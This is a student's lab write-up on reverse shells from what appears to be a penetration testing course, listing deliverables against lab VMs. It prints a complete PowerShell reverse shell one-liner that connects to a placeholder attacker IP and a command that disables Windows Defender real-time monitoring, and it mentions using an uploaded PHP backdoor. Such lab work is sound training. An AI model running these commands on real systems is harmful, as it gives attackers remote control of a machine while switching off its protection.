# Reverse Shells

**Traffic Analysis of bash reverse shell**

**Deliverable 1.** Run wireshark, create a capture filter on 4449/tcp and capture a command or two entered through the nc session. Provide a screenshot showing the followed tcp stream, similar to the screenshot below.

<figure><img src=".gitbook/assets/Screenshot 2025-03-06 185955.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

**Deliverable 2.** Try this out on Pippen by leveraging an uploaded webshell or reverse shell on pippen to run a similar command to connect back to a listener. You may need to upload a small shell script to make this happen, particularly if you are using the simple-backdoor.php script. Provide a screenshot similar to the one below that shows you invoking the reverse shell on the target via curl or your web browser and catching the connection on your kali box.

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Windows Powershell Reverse Shell**

**References**

●  https://book.hacktricks.xyz/shells/shells/windows

The following powershell code is run via cmd.exe.  Change ATTACKERIP and ATTACKERPORT to the eth0 IP on kali and port you assigned to a nc listener.

| powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKERIP',ATTACKERPORT); $stream = $client.GetStream();\[byte\[]]$bytes = 0..65535\|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){;$data= (New-Object -TypeName System.Text.ASCIIENcoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 \| Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

**Microsoft Defender to the Rescue**

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Deliverable 3.** Access your windows VM. Provide a screenshot similar to the one below that shows the unsuccessful execution of powershell via cmd.exe followed by the successful reverse shell after you figure out how to turn off Windows Defender.

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

**Deliverable 4.** Hit the internet, see if you can create a python2,3 or php reverse shell on any of the linux targets. Provide a screenshot similar to the one below as well as the full text of the command used and the results of the id command invoked on the rocky through the reverse shell.

<figure><img src=".gitbook/assets/Screenshot 2025-03-14 175715.jpg" alt=""><figcaption></figcaption></figure>

**Deliverable 5.** Create a technical journal entry about reverse shells.  Make sure to document all the techniques you used in this lab as well as any reflections on areas you were unclear about or wish to pursue further.  Provide a link to this entry and one to your reflections if covered on another page. Make sure to document how to turn off or hamstring Windows Defender. This is best done in powershell.

I used this for reverse shell documentation and for the last python deliverable: [https://www.imperva.com/learn/application-security/reverse-shell/](https://www.imperva.com/learn/application-security/reverse-shell/)

\
I think my favorite part of the lab was disabling windows defender and then doing a windows reverse shell. I feel as if the lab was clear and concise and easy to follow.&#x20;
